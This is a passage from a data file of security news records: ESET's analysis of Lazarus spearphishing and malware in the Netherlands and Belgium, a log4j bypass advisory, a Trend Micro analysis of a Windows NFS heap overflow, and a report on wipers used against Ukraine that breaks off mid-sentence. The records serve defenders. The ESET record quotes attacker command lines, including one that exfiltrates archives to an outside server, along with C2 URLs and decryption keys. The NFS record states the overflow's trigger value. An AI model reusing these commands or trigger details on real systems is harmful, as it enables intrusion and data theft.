497e0b1a-8959-52e0-96b4-727d240cd1ba,30-September-2022,Amazon‑themed campaigns of Lazarus in the Netherlands and Belgium,ESET researchers have discovered Lazarus attacks against targets in the Netherlands and Belgium. attacks used spearphishing emails connected to fake job offers. the attacks targeted an aerospace company in Netherlands and a political journalist in Belgium.,"ESET researchers have discovered Lazarus attacks against targets in the Netherlands and Belgium that use spearphishing emails connected to fake job offers ESET researchers uncovered and analyzed a set of malicious tools that were used by the infamous Lazarus APT group in attacks during the autumn of 2021. The campaign started with spearphishing emails containing malicious Amazon-themed documents and targeted an employee of an aerospace company in the Netherlands, and a political journalist in Belgium. The primary goal of the attackers was data exfiltration. Lazarus (also known as HIDDEN COBRA) has been active since at least 2009. It is responsible for high-profile incidents such as both the Sony Pictures Entertainment hack and tens-of-millions-of-dollar cyberheists in 2016 , the WannaCryptor (aka WannaCry) outbreak in 2017, and a long history of disruptive attacks against South Korean public and critical infrastructure since at least 2011. Both targets were presented with job offers – the employee in the Netherlands received an attachment via LinkedIn Messaging, and the person in Belgium received a document via email. Attacks started after these documents were opened. The attackers deployed several malicious tools on each system, including droppers, loaders, fully featured HTTP(S) backdoors, HTTP(S) uploaders and downloaders. The commonality between the droppers was that they are trojanized open-source projects that decrypt the embedded payload using modern block ciphers with long keys passed as command line arguments. In many cases, malicious files are DLL components that were side-loaded by legitimate EXEs, but from an unusual location in the file system. The most notable tool delivered by the attackers was a user-mode module that gained the ability to read and write kernel memory due to the CVE-2021-21551 vulnerability in a legitimate Dell driver. This is the first ever recorded abuse of this vulnerability in the wild. The attackers then used their kernel memory write access to disable seven mechanisms the Windows operating system offers to monitor its actions, like registry, file system, process creation, event tracing etc., basically blinding security solutions in a very generic and robust way. In this blogpost, we explain the context of the campaign and provide a detailed technical analysis of all the components. This research was presented at this year’s Virus Bulletin conference . Because of the originality, the main focus of the presentation is on the malicious component used in this attack that uses the Bring Your Own Vulnerable Driver (BYOVD) technique and leverages the aforementioned CVE-2021-21551 vulnerability. Detailed information is available in the white paper Lazarus & BYOVD: Evil to the Windows core . We attribute these attacks to Lazarus with high confidence, based on the specific modules, the code-signing certificate, and the intrusion approach in common with previous Lazarus campaigns like Operation In(ter)ception and Operation DreamJob . The diversity, number, and eccentricity in implementation of Lazarus campaigns define this group, as well as that it performs all three pillars of cybercriminal activities: cyberespionage, cybersabotage, and pursuit of financial gain. ESET researchers discovered two new attacks: one against personnel of a media outlet in Belgium and one against an employee of an aerospace company in the Netherlands. In the Netherlands, the attack affected a Windows 10 computer connected to the corporate network, where an employee was contacted via LinkedIn Messaging about a supposed potential new job, resulting in an email with a document attachment being sent. We contacted the security practitioner of the affected company, who was able to share the malicious document with us. The Word file Amzon_Netherlands.docx sent to the target is merely an outline document with an Amazon logo (see Figure 1). When opened, the remote template https://thetalkingcanvas[.]com/thetalking/globalcareers/us/5/careers/jobinfo.php?image=<var>_DO.PROJ (where <var> is a seven-digit number) is fetched. We were unable to acquire the content, but we assume that it may have contained a job offer for the Amazon space program, Project Kuiper . This is a method that Lazarus practiced in the Operation In(ter)ception and Operation DreamJob campaigns targeting aerospace and defense industries. Figure 1. Amazon-themed document sent to the target in the Netherlands Within hours, several malicious tools were delivered to the system, including droppers, loaders, fully featured HTTP(S) backdoors, HTTP(S) uploaders and HTTP(S) downloaders; see the Toolset section. Regarding the attack in Belgium, the employee of a journalism company (whose email address was publicly available on the company’s website) was contacted via an email message with the lure AWS_EMEA_Legal_.docx attached. Since we didn’t obtain the document, we know only its name, which suggests it might have been making a job offer in a legal position. After opening the document, the attack was triggered, but stopped by ESET products immediately, with just one malicious executable involved. The interesting aspect here is that, at that time, this binary was validly signed with a code-signing certificate. We attribute both attacks to the Lazarus group with a high level of confidence. This is based on the following factors, which show relationships to other Lazarus campaigns: One of the typical traits of Lazarus is its delivery of the final payload in the form of a sequence of two or three stages. It starts with a dropper – usually a trojanized open-source application – that decrypts the embedded payload with a modern block cipher like AES-128 (which is not unusual for Lazarus, e.g., Operation Bookcodes , or an obfuscated XOR, after parsing the command line arguments for a strong key. Despite the embedded payload not being dropped onto the file system but loaded directly into memory and executed, we denote such malware as a dropper. Malware that doesn’t have an encrypted buffer, but that loads a payload from a filesystem, we denote as a loader. The droppers may (Table 1) or may not (Table 2) be side-loaded by a legitimate (Microsoft) process. In the first case here, the legitimate application is at an unusual location and the malicious component bears the name of the corresponding DLL that is among the application’s imports. For example, the malicious DLL coloui.dll is side-loaded by a legitimate system application Color Control Panel ( colorcpl.exe ), both located at C:\ProgramData\PTC\ . However, the usual location for this legitimate application is %WINDOWS%\System32\ . In all cases, at least one command line argument is passed during runtime that serves as an external parameter required to decrypt the embedded payload. Various decryption algorithms are used; see the last column in Table 1 and Table 2. In several cases when AES-128 is used, there’s also an internal, hardcoded parameter together with the name of the parent process and its DLL name, all required for successful decryption. Table 1. Malicious DLLs side-loaded by a legitimate process from an unusual location Table 2. Other malware involved in the attack After successful decryption, the buffer is checked for the proper PE format and execution is passed to it. This procedure can be found in most of the droppers and loaders. The beginning of it can be seen in Figure 2. Figure 2. The decrypted buffer is a 64-bit executable We identified a fully featured HTTP(S) backdoor – a RAT known as BLINDINGCAN – used in the attack. This payload’s dropper was executed as %ALLUSERSPROFILE%\PTC\colorui.dll ; see Table 1 for details. The payload is extracted and decrypted using a simple XOR but with a long key, which is a string built by concatenating the name of the parent process, is own filename, and the external command line parameter – here COLORCPL.EXECOLORUI.DLLBE93E050D9C0EAEB1F0E6AE13C1595B5 . The payload, SHA-1: 735B7E9DFA7AF03B751075FD6D3DE45FBF0330A2 , is a 64-bit VMProtect-ed DLL. A connection is made to one of the remote locations https://aquaprographix[.]com/patterns/Map/maps.php or https://turnscor[.]com/wp-includes/feedback.php . Within the virtualized code we pivoted via the following very specific RTTI artifacts found in the executable: .?AVCHTTP_Protocol@@, .?AVCFileRW@@ . Moreover, there’s a similarity on the code level, as the indices of the commands start with the same value, 8201 ; see Figure 3. This helped us to identify this RAT as BLINDINGCAN (SHA-1: 5F4FBD57319BD0D2DF31131E864FDDA9590A652D ), reported for the first time by CISA . The recent version of this payload was observed in another Amazon-themed campaign, where BLINDINGCAN was dropped by a trojanized Putty-0.77 client: see Mandiant’s blog. Figure 3. Code comparison of plain (upper, unprotected) and virtualized (lower, VMProtect-ed) variants of BLINDINGCAN, with an agreement of two command indices, 8256 and 8201 Based on the number of command codes that are available to the operator, it is likely that a server-side controller is available where the operator can control and explore compromised systems. Actions made within this controller probably result in the corresponding command IDs and their parameters being sent to the RAT running on the target’s system. The list of command codes is in Table 3 and agrees with the analysis done by JPCERT/CC , Appendix C. There are no validation checks of parameters like folder or filenames. That means all the checks have to be implemented on the server side, which suggests that the server-side controller is a complex application, very likely with a user-friendly GUI. Table 3. The RAT’s commands Now we describe a three-stage chain where, unfortunately, we were able to identify only the first two steps: a dropper and an intermediate loader. The first stage is a dropper located at C:\Windows\Vss\credui.dll and was run via a legitimate – but vulnerable to DLL search-order hijacking – application with the (external) parameter C:\Windows\Vss\WFS.exe A39T8kcfkXymmAcq . The program WFS.exe is a copy of the Windows Fax and Scan application, but its standard location is %WINDOWS%\System32\ . The dropper is a trojanized GOnpp plug-in for Notepad++, written in the Go programming language. After the decryption, the dropper checks whether the buffer is a valid 64-bit executable and then, if so, loads it into memory, so that the second stage is ready for execution. The goal of this intermediate stage is to load an additional payload in memory and execute it. It performs this task in two steps. It first reads and decrypts the configuration file C:\windows\System32\wlansvc.cpl , which is not, as its extension might suggest, an (encrypted) executable, but a data file containing chunks of 14944 bytes with configuration. We didn’t have the particular data from the current attack; however, we obtained such configuration from another Lazarus attack: see Figure 5.The configuration is expected to start with a double word representing the total size of the remaining buffer (see Line 69 in Figure 4 below and the variable u32TotalSize ), followed by an array of 14944 byte-long structures containing at least two values: the name of the loading DLL as a placeholder for identifying the rest of the configuration (at the offset 168 of Line 74 in Figure 4 and the highlighted member in Figure 5). Figure 4. The first step of decrypting the configuration file and checking if the name of the loading DLL matches the expected one The second step is the action of reading, decrypting, and loading this file that represents very likely the third and final stage. It is expected to be a 64-bit executable and is loaded into the memory the same way the first-stage dropper handled the intermediate loader. At the start of execution, a mutex is created as a concatenation of the string Global\AppCompatCacheObject and the CRC32 checksum of its DLL name ( credui.dll ) represented as a signed integer. The value should equal Global\AppCompatCacheObject-1387282152 if wlansvc.cpl exists and -1387282152 otherwise. Figure 5. A configuration of the intermediate loader. The highlighted file name is expected to match with the name of the running malware; see also Figure 4. An interesting fact is the use of this decryption algorithm (Figure 4, Line 43 & 68), which is not that prevalent in the Lazarus toolset nor malware in general. The constants 0xB7E15163 and 0x61C88647 (which is -0x9E3779B9 ; see Figure 6, Line 29 & 35) in the key expansion suggests that it’s either the RC5 or RC6 algorithm. By checking the main decryption loop of the algorithm, one identifies that it’s the more complex of the two, RC6. An example of a sophisticated threat using such uncommon encryption is Equations Group’s BananaUsurper; see Kaspersky’s report from 2016. Figure 6. Key expansion of RC6 A downloader using the HTTP(S) protocols was delivered onto the target’s system as well. It was installed by a first stage dropper (SHA1: 001386CBBC258C3FCC64145C74212A024EAA6657 ), which is a trojanized libpcre-8.44 library. It was executed by the command cmd.exe /c start /b rundll32.exe C:\PublicCache\msdxm.ocx,sCtrl 93E41C6E20911B9B36BC (the parameter is an XOR key for extracting the embedded payload; see Table 2). The dropper also achieves persistence by creating the OneNoteTray.LNK file located in the %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup folder. The second stage is a 32-bit VMProtect-ed module that makes an HTTP connection request to a C&C server stored in its configuration; see Figure 7. It uses the same User Agent – Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/28.0.1500.95 Safari/537.36 – as BLINDINGCAN RAT, contains the RTTI artifact .?AVCHTTP_Protocol@@ but not .?AVCFileRW@@ , and lacks features like taking screenshots, archiving files, or executing a command via the command line. It is able to load an executable to a newly allocated memory block and pass code execution to it. Figure 7. A configuration of the HTTP(S) downloader. The highlighted values are the size of the configuration and the number of URLs. In the attack we observed, all the URLs were identical. This Lazarus tool is responsible for data exfiltration, by using the HTTP or HTTPS protocols. It is delivered in two stages as well. The initial dropper is a trojanized sqlite-3.31.1 library. Lazarus samples usually don’t contain a PDB path, but this loader has one, W:\Develop\Tool\HttpUploader\HttpPOST\Pro\_BIN\RUNDLL\64\sqlite3.pdb , which also suggests its functionality immediately – a HTTP Uploader. The dropper expects multiple command line parameters: one of them is a password required to decrypt and load the embedded payload; the rest of parameters are passed to the payload. We didn’t catch the parameters, but luckily an in-the-wild use of this tool was observed in a forensic investigation by HvS Consulting : C:\ProgramData\IBM\~DF234.TMP S0RMM-50QQE-F65DN-DCPYN-5QEQA https://www.gonnelli.it/uploads/catalogo/thumbs/thumb.asp C:\ProgramData\IBM\restore0031.dat data03 10000 -p 192.168.1.240 8080 The first parameter, S0RMM-50QQE-F65DN-DCPYN-5QEQA , worked as a key for the decryption routine of the dropper (to be more precise, an obfuscation was performed first, where the encrypted buffer was XOR-ed with its copy shifted by one byte; then an XOR decryption with the key followed). The rest of the parameters are stored in a structure and passed to the second stage. For the explanation of their meanings, see Table 4. Table 4. Command line parameters for the HTTP(S) updater The second stage is the HTTP uploader itself. The only parameter for this stage is a structure containing the C&C server for the exfiltration, the filename of a local RAR archive, the root name of a RAR archive on the server-side, the total size of a RAR split in kilobytes, an optional range of split indices, and an optional -p switch with the internal proxy IP and a port; see Table 4. For example, if the RAR archive is split into 88 chunks, each 10,000 kB large, then the uploader would submit these splits and store them on the server side under names data03.000000.avi , data03.000001.avi , …, data03.000087.avi . See Figure 8, Line 42 where these strings are formatted. The User-Agent is the same as for BLINDINGCAN and the HTTP(S) downloader, Mozilla/5.0 ( Windows NT 6.1; WOW64) Chrome/28.0.1500.95 Safari/537.36. Figure 8. The exfiltration of RAR splits to a C&C server We identified a dynamically linked library with the internal name FudModule.dll that tries to disable various Windows monitoring features. It does so by modifying kernel variables and removing kernel callbacks, which is possible because the module acquires the ability to write in the kernel by leveraging the BYOVD techniques – the specific CVE-2021-21551 vulnerability in the Dell driver dbutil_2_3.sys. The full analysis of this malware is available as a VB2022 paper Lazarus & BYOVD: evil to the Windows core . Additional droppers and loaders were discovered in the attacks, but we didn’t obtain the necessary parameters to decrypt the embedded payloads or encrypted files. A project lecui by Alec Musafa served the attackers as a code base for trojanization of two additional loaders. By their filenames, they were disguised as Microsoft libraries mi.dll (Management Infrastructure) and cryptsp.dll (Cryptographic Service Provider API), respectively, and this was due to the intended side-loading by the legitimate applications wsmprovhost.exe and SMSvcHost.exe , respectively; see Table 1. The main purpose of these loaders is to read and decrypt executables located in alternate data streams (ADS) at C:\ProgramData\Caphyon\mi.dll:Zone.Identifier and C:\Program Files\Windows Media Player\Skins\DarkMode.wmz:Zone.Identifier , respectively. Since we haven’t acquired these files, it’s not known which payload is hidden there; however, the only certainty is that it’s an executable, since the loading process follows the decryption (see Figure 2). The use of ADS is not new, because Ahnlab reported a Lazarus attack against South Korean companies in June 2021 involving such techniques. ESET blocked an additional trojanized open-source application, FingerText 0.5.61 by erinata , located at %WINDIR%\security\credui.dll . The correct command line parameters are not known. As in some of the previous cases, three parameters were required for the AES-128 decryption of the embedded payload: the parent process’s name, WFS.exe ; the internal parameter, mg89h7MsC5Da4ANi ; and the missing external parameter. The attack against a target in Belgium was blocked early in its deployment chain so only one file was identified, a 32-bit dropper located at C:\PublicCache\msdxm.ocx . It is an sslSniffer component from the wolfSSL project that has been trojanized. At the time of the attack, it was validly signed with a certificate issued to “A” MEDICAL OFFICE, PLLC (see Figure 8), which has since expired. Figure 9. Validly signed but already expired certificate It has two malicious exports that the legitimate DLL doesn’t have: SetOfficeCertInit and SetOfficeCert . Both exports require exactly two parameters. The purpose of the first export is to establish persistence by creating OfficeSync.LNK , located in %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup , pointing to the malicious DLL and running its second export via rundll32.exe with the parameters passed to itself. The second export, SetOfficeCert , uses the first parameter as a key to decrypt the embedded payload, but we couldn’t extract it, because the key is not known to us. The decryption algorithm is also interesting as the attackers use HC-128 with the 128-bit key as the first parameter and for its 128-bit initialization vector, the string ffffffffffffffff . The constants revealing the cipher are displayed in Figure 10. Figure 10. The key setup with highlighted constants suggesting the HC-128 cipher In this attack, as well as in many others attributed to Lazarus, we saw that many tools were distributed even on a single targeted endpoint in a network of interest. Without a doubt, the team behind the attack is quite large, systematically organized, and well prepared. For the first time in the wild, the attackers were able to leverage CVE-2021-21551 for turning off the monitoring of all security solutions. It was not just done in kernel space, but also in a robust way, using a series of little- or undocumented Windows internals. Undoubtedly this required deep research, development, and testing skills. From the defenders’ point of view, it seems easier to limit the possibilities of initial access than to block the robust toolset that would be installed after determined attackers gain a foothold in the system. As in many cases in the past, an employee falling prey to the attackers’ lure was the initial point of failure here. In sensitive networks, companies should insist that employees not pursue their personal agendas, like job hunting, on devices belonging to their company’s infrastructure. For any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com . ESET Research now also offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the ESET Threat Intelligence page. A comprehensive list of Indicators of Compromise and samples can be found in our GitHub repository. This table was built using version 11 of the MITRE ATT&CK framework. Ahnlab. Analysis Report on Lazarus Group’s Rootkit Attack Using BYOVD . Vers. 1.0. 22 September 2022. Retrieved from AhnLab Security Emergency Response Center. Ahnlab. (2021, June 4). APT Attacks on Domestic Companies Using Library Files . Retrieved from AhnLab Security Emergency Response Center. Ahnlab. (2022, September 22). Analysis Report on Lazarus Group’s Rootkit Attack Using BYOVD . Retrieved from AhnLab Security Emergency Response Center. Breitenbacher, D., & Kaspars, O. (2020, June). Operation In(ter)ception: Aerospace and military companies in the crosshairs of cyberspies . Retrieved from WeLiveSecurity.com. ClearSky Research Team. (2020, August 13). Operation ‘Dream Job’ Widespread North Korean Espionage Campaign . Retrieved from ClearSky.com. Dekel, K. (n.d.). Sentinel Labs Security Research. CVE-2021-21551- Hundreds Of Millions Of Dell Computers At Risk Due to Multiple BIOS Driver Privilege Escalation Flaws . Retrieved from SentinelOne.com. ESET. (2021, June 3). ESET Threat Report T 1 2021 . Retrieved from WeLiveSecurity.com. GReAT. (2016, August 16). The Equation giveaway . Retrieved from SecureList.com. HvS-Consulting AG. (2020, December 15). Greetings from Lazarus: Anatomy of a cyber-espionage campaign . Retrieved from hvs-consulting.de. Cherepanov, A., & Kálnai, P. (2020, November). Lazarus supply-chain attack in South Korea . Retrieved from WeLiveSecurity.com. Kálnai, P. (2017, 2 17). Demystifying targeted malware used against Polish banks . (ESET) Retrieved from WeLiveSecurity.com. Kopeytsev, V., & Park, S. (2021, February). Lazarus targets defense industry with ThreatNeedle . (Kaspersky Lab) Retrieved from SecureList.com. Lee, T.-w., Dong-wook, & Kim, B.-j. (2021). Operation BookCode – Targeting South Korea . Virus Bulletin. localhost. Retrieved from vblocalhost.com. Maclachlan, J., Potaczek, M., Isakovic, N., Williams, M., & Gupta, Y. (2022, September 14). It’s Time to PuTTY! DPRK Job Opportunity Phishing via WhatsApp . Retrieved from Mandiant.com. Tomonaga, S. (2020, September 29). BLINDINGCAN – Malware Used by Lazarus . (JPCERT/CC) Retrieved from blogs.jpcert.or.jp. US-CERT CISA. (2020, August 19). MAR-10295134-1.v1 – North Korean Remote Access Trojan: BLINDINGCAN . (CISA) Retrieved from cisa.gov. Weidemann, A. (2021, 1 25). New campaign targeting security researchers . (Google Threat Analysis Group) Retrieved from blog.google. Wu, H. (2008). The Stream Cipher HC-128. In M. Robshaw , & O. Billet , New Stream Cipher Designs (Vol. 4986). Berlin, Heidelberg: Springer. Retrieved from doi.org."
e0a711c0-543b-5c40-b42d-fd34930de966,10-December-2021,"Urgent｜Apache log4j-2.15.0-rc1 version has a bypass risk, please upgrade to log4j-2.15.0-rc2 as soon as possible!","360 Security Center monitored that Apache officially released the log4j-2.15.0-rc1 version on December 7, 2021. 360 Group says the latest version has bypass risks and security risks. 360 says the vulnerability affects 310 products and open source components that depend on the log 4j2 logging framework.","Learn more about 360 Total Security On December 9, 360 Security Center monitored that Apache officially released the log4j-2.15.0-rc1 version on December 7, 2021. According to the research and judgment of 360 Group’s security experts, this version has bypass risks and security risks. The manufacturer has released the latest version log4j-2.15.0-rc2, please update as soon as possible. After the logging function is turned on, the component can be successfully exploited by inserting the exploit code wherever the error log can be triggered. If the log recorded by this component contains the log of other systems, it may cause indirect infection. Through the intermediate system, the component indirectly reads the offensive exploit code, which can also indirectly cause the vulnerability to be triggered. According to 360 vulnerability cloud security experts, log4j2 is a widely used java logging framework around the world. At the same time, the vulnerability also affects many common open source components that are used globally, such as Apache Struts2, Apache Solr, Apache Druid, and Apache Flink. The exploit method of this vulnerability is simple and the damage is serious. The latest version of the product has been officially released. It is recommended that users upgrade the components as soon as possible to fix and mitigate the vulnerability. Vulnerability impact analysis Through Google search engine to analyze the products and other open source components that depend on this component, it is found that 310 products and open source components depend on the version of Apache Log4j2 2.14.1. According to the network space surveying system Quake, the deployment volume of products written in Java language on the entire network is shown in the following figure: It can be seen from the statistics table of the world’s top 5 in terms of usage that the first place in the usage of Java development language is the United States, and the second is China, and the usage of China and the United States is almost the same. Because the vulnerable component is a basic component of Java products, the vulnerability affects the entire industry. All companies that use Java as a development language to develop products or companies that use Java language to develop products need to self-check their own security risks. Repairs and Suggestions Upgrade to the latest version as soon as possible by referring to the official website address in the link: https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2 Configure the network firewall to prohibit the system from actively connecting to the network, including but not limited to DNS, TCP/IP, and ICMP. Upgrade the applications and components that are known to be affected, such as srping-boot-strater-log4j2, ApacheSolr, Apache Flink, Apache Druid. Check the log centralized management server, as well as commercial software developed based on java, and other basic environments that may have hidden dangers. Emergency reinforcement and mitigation measures: ①Set parameters: log4j2.formatMsgNoLookups=True ② Modify JVM parameters: -Dlog4j2.formatMsgNoLookups=true ③System environment variables: FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS is set to true ④Prohibit external connection to the server where log4j2 is located Learn more about 360 Total Security"
b41b376a-1b68-520d-b2d9-517e228cf55c,06-September-2022,CVE-2022-34715: More Microsoft Windows NFS v4 Remote Code Execution,Trend Micro researchers report a vulnerability in the Windows Network File System protocol. The vulnerability allows an attacker to execute arbitrary code in the context of SYSTEM. The bug is the result of a dynamically allocated buffer created by an NFS function.,"In this excerpt of a Trend Micro Vulnerability Research Service vulnerability report, Quintin Crist and Dusan Stevanovic of the Trend Micro Research Team detail a recently patched remote code execution vulnerability in the Microsoft Windows operating system, originally discovered and reported by the researcher known as Arimura. The bug is the result of a dynamically allocated buffer created by an NFS function and is present only on Windows Server 2022. An unauthenticated attacker could exploit this bug to execute arbitrary code in the context of SYSTEM. This is the third such NFS vulnerability in as many months. The following is a portion of their write-up covering CVE-2022-34715, with a few minimal modifications. A remote code execution vulnerability exists in Windows Network File System. The vulnerability is due to incorrect validation of fields within an NFS request. A remote attacker can exploit this vulnerability by sending malicious RPC calls to a target server. Successful exploitation results in arbitrary code execution in the context of SYSTEM. Unsuccessful exploitation may result in a crash of the target system. The Vulnerability Microsoft Windows ships with several network features designed to communicate and interact with non-Windows file shares. One of these modules is called Network File System (NFS). NFS is a protocol originally developed by Sun Microsystems in 1984. Version 2 is documented in RFC 1094 . Version 3 is documented in RFC 1813 . Version 4 was developed by the IETF and is documented in RFC 3010 (released December 2000) and revised in RFC 3530 (released April 2003) and RFC 7530 (released March 2015). NFS allows users to access remote file shares in the same way that the local file system is accessed. Different access levels and permissions can be set on shares, such as read-write and read-only. Additionally, IP/UID/GID/Kerberos security can be used. NFS uses Open Network Computing (ONC) Remote Procedure Call (RPC) to exchange control messages. ONC RPC was originally developed by Sun Microsystems and can also be referred to as Sun RPC . When ONC RPC messages are transferred over TCP, they are prepended with a Fragment header structure (as illustrated in the following table) that specifies the length of the message. This allows the receiver to distinguish multiple messages sent over a single TCP session. Other protocols such as UDP do not use this field. Note that all multi-byte values are encoded in big-endian byte order. The structure of ONC RPC request messages, in general, is as follows: The Credentials structure in a Sun-RPC message has the following structure: The Flavor field in the above structure serves as a type identifier of the Contents data. Security flavors have been called authentication flavors for historical reasons. There are multiple security flavors defined in the RPC specification, such as AUTH_NONE(0), AUTH_SYS(1), AUTH_SHORT(2), AUTH_DH(3), and RPCSEC_GSS(6). The Contents field for the flavor RPCSEC_GSS has the following structure: There are four types defined for the GSS Procedure field: RPCSEC_GSS_DATA(0), RPCSEC_GSS_INIT(1), RPCSEC_GSS_CONTINUE_INIT(2), and RPCSEC_GSS_DESTROY(3). Also, for the GSS Service field, there are three types: rpc_gss_svc_none(1), rpc_gss_svc_integrity(2), and rpc_gss_svc_privacy(3). When using RPCSEC_GSS to authenticate RPC clients, a security context must be created by using RPCSEC_GSS_INIT and RPCSEC_GSS_CONTINUE_INIT RPC messages. First, the RPC client sends an RPCSEC_GSS_INIT message to start the creation of the context. Then, the RPC server decides whether it needs another token for the creation. If so, the server replies with a GSS_S_CONTINUE_NEEDED message, and the client needs to send an RPCSEC_GSS_CONTINUE_INIT message to continue. If the GSS Service field is set to 2 (rpc_gss_svc_integrity), the Program-specific data field is prefixed with the following structure: If the GSS Service field is set to 3 (rpc_gss_svc_privacy), the Program-specific data field is encrypted. When the Program field is set to 100003 (NFS) and the Procedure field is set to 1 (Compound), the Program-specific data field has the following structure: In the request data, for each operation in the message: Operation data for opcode OP_CREATE(6) : Operation data for opcode OP_OPEN(18): Operation data for opcode OP_SETATTR(34): Attributes Data (fattr4) has the following format: Attributes Data for ACL ( Bit12, 0x1000 ): A buffer overflow vulnerability exists in the Windows implementation of NFS. The vulnerability is due to incorrect validation of the of the ACE_Count field when processing ACL attribute data in Nfs4SrvAclBuildWindowsAclsFromNfsAcl . This function is only vulnerable when setting ACL attribute data using opcodes 6, 18, 34. The server allocates a response buffer of size (ACE_Count << 5) . This size is stored as a uint64_t in Nfs4SrvAclBuildWindowsAclsFromNfsAcl . A buffer of this size is created using NfsMemMgrBufferAllocate . However, NfsMemMgrBufferAllocate only takes a uint32_t for the buffer size, so the upper 32 bits of the requested size is ignored. This allows an attacker to specify an ACE_Count such that (ACE_Count << 5) & 0xFFFFFFFF < ACE_Count . This will result in a buffer overflow later in the function when the buffer is used. In particular, ACE_Count values above 0x8000000 will trigger this vulnerability. Note that ACE_Count = 0x8000000 itself is not vulnerable since NfsMemMgrBufferAllocate will error when the requested length is zero. An attacker can use this vulnerability to overflow a heap buffer. Successful exploitation may result in arbitrary code execution in the context of SYSTEM. Unsuccessful exploitation will result in a crash of the target system. Source Code Walkthrough The following code snippet was taken from nfssvr.sys version 10.0.20348.825. Comments have been added by Trend Micro researchers. Detecting Attacks The detection device needs to check if the Program field in an RPC request message has the value 100003 (NFS), Procedure field has the value 1 (COMPOUND), and Program Version field has the value 4 (NFS4). If found, the device must inspect the Program-specific data in the ONC RPC messages. The detection device should check for the vulnerable opcodes (6, 18, 34) in each operation. If present the device should check the operation for ACL attribute data. If ACL attribute data is present, the device should check for an ACE_Count field above 0x8000000. There is no fixed offset into the message that can be used to ignore non-vulnerable opcodes since NFS operations do not consistently contain a length of the operation data. The full message must be processed to determine if there is any ACL attribute data. If the ACE_Count field is greater than 0x8000000, the traffic should be considered suspicious; an attack exploiting this vulnerability is likely underway. Conclusion This bug was patched by Microsoft in August 2022 and assigned CVE-2022-34715 . Their advisory lists the vulnerability as not requiring authentication. However, all known exploitation paths require file creation or modification privileges. In their write-up, they also list disabling NFSv4.1 as a method to mitigate attacks. However, this could lead to a loss of functionality. Applying the NFS-related updates is the best method to fully address the multiple NFS bugs patched in recent months. Special thanks to Quintin Crist and Dusan Stevanovic of the Trend Micro Research Team for providing such a thorough analysis of this vulnerability. For an overview of Trend Micro Research services please visit http://go.trendmicro.com/tis/ . The threat research team will be back with other great vulnerability analysis reports in the future. Until then, follow the team on Twitter or Instagram for the latest in exploit techniques and security patches."
1a24667b-e03d-5f39-a261-313dfc2bf1dc,28-February-2022,Exclusive in-depth analysis: directly attack the key technical details of Ukraine’s cyber warfare,"360 Security Center observed a state-level cyber warfare attack against Ukraine. The attacks may be aimed at causing chaos in Ukraine, hindering communications and weakening the government. 360 says APT groups are using supply chain attacks and exploits to conduct a cyber war.","Learn more about 360 Total Security Recently, 360 Security Center observed a state-level cyber warfare attack against Ukraine for the purpose of sabotage, including distributed denial of service (DDoS) attacks, phishing scams, exploits, supply chain attacks, malicious data wipes disguised as ransomware Except for attacks, etc. Through the first analysis and judgment of the 360 security team, these cyber attacks may be aimed at causing chaos in Ukraine, hindering communications, and weakening Ukraine’s government, civilian and military institutions. It is a long-planned cyber war. This analysis report will analyze the key technical details of this cyber war from the global perspective of 360 Security Center. Ukraine Cyber Attack Timeline January 14, 2022 More than 70 Ukrainian government websites were attacked by the APT group, including those belonging to the Ukrainian Ministry of Foreign Affairs, Ministry of Defense, State Emergency Service, Cabinet and Ministry of Foreign Affairs. January 17, 2022 The National Cyber Police Service of Ukraine issued a security notice. On the evening of January 14, 95% of the hacked Ukrainian government websites were back to work. However, more serious destructive attacks than modifying the behavior of the website pages are still going on. Since that night, some Ukrainian government agencies have been subjected to violent DDOS attacks, and at the same time, there has been data erasure and destruction disguised as “WhisperGate” ransomware. malicious sample attack. According to the official description, the relevant APT groups are using a combination of supply chain attacks, OctoberCMS (a CMS program widely used in Ukraine) exploits and Log4j vulnerabilities to conduct a combined cyber-attack sabotage campaign. January 18, 2022 U.S. CISA issued a security notice related to the Ukraine ransomware attack, stating that organizations in Ukraine suffered a series of malicious network incidents, including DDOS, website hacking and potentially destructive malware, of which destructive malware is the most worrying, because Historically, there have been destructive attacks suspected of counterfeit ransomware, such as NotPetya and WannaCry, causing widespread damage to critical infrastructure. CISA requires every organization in the United States to take immediate, urgent steps to mitigate the impact of a potentially damaging attack. February 23, 2022 The security community is starting to notice that Ukraine has begun spreading new data-wiping malware, HermeticWiper. Ukraine suffers from multiple three-dimensional cyber attacks The first attack: WhisperGate data wiper Before and after the first wave of WhisperGate attacks, 360 Security Center’s network-wide view observed that the attacks began on January 10, until January 15, when Microsoft said that it found that APT groups had delivered WhisperGate samples to some important institutions in Ukraine, and the destruction of related samples The action encrypts the disk MBR and files of the specified type on the machine. WhisperGate Some sample information stage1.exe 5d5c99a08a7d927346ca2dafa7973fc1 stage2.exe 14c8482f302b5e81e3fa1b18a509289d Tbopbh.jpg b3370eb3c5ef6c536195b3bea0120929 Frkmlkdkdubkznbkmcf.dll e61518ae9454a563b8f842286bbdb87b WhisperGate implements a three-stage data breach attack: Stage 1: Overwrite the MBR and destroy all partitions Stage 2: Download Stage 3 via CDN hosted by the Discord service Stage 3: Execute the file wiper According to the global vision observation of 360 Security Center, some specific attack process chains of WhisperGate are as follows: The second round of attacks: HermeticWiper data wiper The security community first noticed the HermeticWiper attack on February 23, saying that the APT group delivered HermeticWiper to hundreds of organizations in Ukraine for a second sabotage attack. HermeticWiper Some sample information cdel.exe 3f4a16b29f2f0532b7ce3e7656799125 Bpdr.sys 6106653b08f4f72eeaa7f099e7c408a4 According to the global vision observation of 360 Security Center, some of the attacks were initiated by planned tasks, which were suspected to be delivered and implanted by controlling intranet domain controllers and exploits of different network services. The imminent supply chain attack crisis According to the analysis and deduction of the 360 Advanced Threat Research Institute, large-scale sabotage attacks implemented in cyber warfare are very likely to spread to the world because they are not under the control of the attackers, and relevant organizations need to be vigilant. At present, there is no publicly disclosed cyber intelligence on cyber warfare supply chain attacks against Ukraine, but as early as 2017, “NotPetya” suspected of disguising as ransomware used software updates to launch supply chain attacks, and related attacks first became popular in Ukraine This complex supply chain attack method caused 80% of Ukraine’s enterprises to be attacked and damaged by “NotPetya” to varying degrees. Unexpectedly, “NotPetya” is still spreading around the world, disrupting key IT systems of international shipping and logistics companies such as Maersk and TNT, 